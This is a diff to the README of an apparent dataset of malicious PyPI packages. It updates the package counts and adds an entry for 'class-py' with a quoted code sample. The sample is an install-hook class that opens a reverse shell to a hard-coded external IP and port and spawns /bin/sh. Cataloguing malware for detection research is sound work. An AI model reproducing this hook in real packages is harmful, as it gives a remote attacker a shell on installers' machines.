@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,118 versions of the source code of 5,372 malicious packages.
+This data set includes about 6,119 versions of the source code of 5,373 malicious packages.
 
 ## Dataset Format
 
@@ -632,7 +632,22 @@ class AfterInstall(install):
 ```
 
 ### 24 Jun. 2024
+class-py [1.0.0] <br>
 builderknower2 [0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29, 0.1.30] <br>
+
+```python
+class myclass(install): 
+    def run(self): 
+        LHOST = "85.159.212.47"
+        LPORT = 61985 
+ 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s.connect((LHOST, LPORT)) 
+        os.dup2(s.fileno(), 0) 
+        os.dup2(s.fileno(), 1) 
+        os.dup2(s.fileno(), 2) 
+        pty.spawn("/bin/sh") 
+```
 
 ## About the malicious packages detection
 
